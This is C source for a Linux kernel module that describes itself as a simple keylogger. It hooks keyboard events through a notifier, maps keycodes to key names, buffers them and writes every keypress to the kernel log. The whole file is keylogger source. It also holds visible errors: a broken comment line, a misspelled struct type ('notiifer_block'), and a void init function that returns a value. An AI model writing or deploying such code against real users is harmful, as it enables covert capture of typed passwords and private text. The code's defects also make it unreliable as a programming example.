#include <linux/init.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/semaphore.h>

//
// Buffer to store key events
//
#define KEYBUF_SIZE 1024
static char keybuf[KEYBUF_SIZE];
static int keybuf_index = 0;

// Keycode to ASCII map (very simplified, only lowercase letters + digits)
static const char *keymap[] = {
    "",         "<ESC>", "1",       "2", "3", "4",      "5",        "6",  "7",
    "8",        "9",     "0",       "-", "=", "<BKSP>", "<TAB>",    "q",  "w",
    "e",        "r",     "t",       "y", "u", "i",      "o",        "p",  "[",
    "]",        "\n",    "<LCTRL>", "a", "s", "d",      "f",        "g",  "h",
    "j",        "k",     "l",       ";", "'", "`",      "<LSHIFT>", "\\", "z",
    "x",        "c",     "v",       "b", "n", "m",      ",",        ".",  "/",
    "<RSHIFT>", "*",     "<ALT>",   " "};

//
// Callback function for keyboard events
//
static int keylogger_notifier(struct notifier_block *nb, unsigned long action,
                              void *data) {
  struct keyboard_notifier_param *param = data;
  if (action == KBD_KEYSYM && param->down) {
    if (param->value < ARRAY_SIZE(keymap)) {
      const char *key = keymap[param->value];

      if (keybuf_index + strlen(key) + 1 < KEYBUF_SIZE) {
        strcat(keybuf, key);
        strcat(keybuf, " ");
        keybuf_index += strlen(key) + 1;
      }

      printk(KERN_WARNING "Key pressed: %s\n", key);
    } else {
      printk(KERN_WARNING "Unknown key pressed: %d\n", param->value);
    }
  }

  return NOTIFY_OK;
}

/
    // Register a keyboard notifier
    //
    static struct notiifer_block nb = {.notifier_call = keylogger_notifier};

static void __init keylogger_init(void) {
  // Initialization code for the keylogger
  printk(KERN_INFO "Keylogger module initialized.\n");
  memset(keybuf, 0, sizeof(keybuf));
  return register_keyboard_notifier(&nb);
}

static void __exit keylogger_exit(void) {
  // Cleanup code for the keylogger
  unregister_keyboard_notifier(&nb);
  printk(KERN_INFO "Keylogger module exited.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("devartstar");
MODULE_DESCRIPTION("A simple keylogger module for Linux");
MODULE_VERSION("0.1");
